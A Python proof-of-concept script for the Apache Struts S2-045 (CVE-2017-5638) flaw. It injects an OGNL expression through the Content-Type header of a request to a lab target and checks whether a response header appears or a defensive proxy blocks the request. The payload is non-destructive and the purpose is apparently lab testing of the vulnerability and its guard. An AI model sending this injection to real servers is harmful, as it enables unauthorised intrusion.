#!/usr/bin/env python3
"""Send a non-destructive CVE-2017-5638 proof request to the lab target."""

import argparse
import sys
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


PAYLOAD = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Lab-Proof',233*233)}.multipart/form-data"


def main():
    parser = argparse.ArgumentParser(description="Replay the safe S2-045 lab proof header")
    parser.add_argument("target", help="Target VM host-only IP, for example 192.168.56.20")
    parser.add_argument("--port", type=int, choices=(8080, 8081), default=8080,
                        help="8080 = direct vulnerable target; 8081 = guarded path (default: 8080)")
    args = parser.parse_args()

    url = f"http://{args.target}:{args.port}/"
    request = Request(url, data=b"", method="POST", headers={
        "Content-Type": PAYLOAD,
        "User-Agent": "Equifax-S2-045-Isolated-Lab/1.0",
        "Connection": "close",
    })

    print(f"Target: {url}")
    print("Technique: S2-045 expression evaluation in Content-Type")
    print("Effect: add X-Lab-Proof response header (no OS command or file changes)")
    try:
        try:
            response = urlopen(request, timeout=8)
        except HTTPError as error:
            response = error
        proof = response.headers.get("X-Lab-Proof", "<absent>")
        print(f"HTTP status: {response.status}")
        print(f"X-Lab-Proof: {proof}")
        if response.status == 200 and proof == "54289":
            print("RESULT: expression evaluated by the vulnerable target")
            return 0
        if response.status == 403:
            print("RESULT: request blocked by the defensive proxy")
            return 0
        print("RESULT: no proof header; inspect the target/proxy logs")
        return 1
    except (URLError, TimeoutError, OSError) as error:
        print(f"Request failed: {error}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
